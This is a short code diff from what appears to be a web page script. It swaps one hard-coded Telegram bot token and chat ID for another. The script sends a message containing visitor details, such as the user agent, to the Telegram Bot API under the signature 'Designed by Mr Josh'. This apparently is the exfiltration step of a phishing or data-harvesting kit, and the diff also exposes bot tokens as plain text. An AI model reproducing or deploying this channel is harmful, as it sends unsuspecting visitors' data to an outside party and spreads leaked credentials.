@@ -178,8 +178,8 @@ User Agent: ${userAgent}\n
 Designed by Mr Josh
         `;
 
-        const telegramToken = '8207299533:AAGK4PZLcU9KFJ5-8dy2Pb3RbJkReRlojHc'; 
-        const chatId = '6680550071'; 
+        const telegramToken = '6106561885:AAF0EmQXOgj_TVWoaiJ75Exmhjx_WcD-SZo'; 
+        const chatId = '5643928959'; 
         const apiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
 
         const payload = {
@@ -212,3 +212,4 @@ Designed by Mr Josh
         return { formattedDate, formattedTime };
     }
 });
+
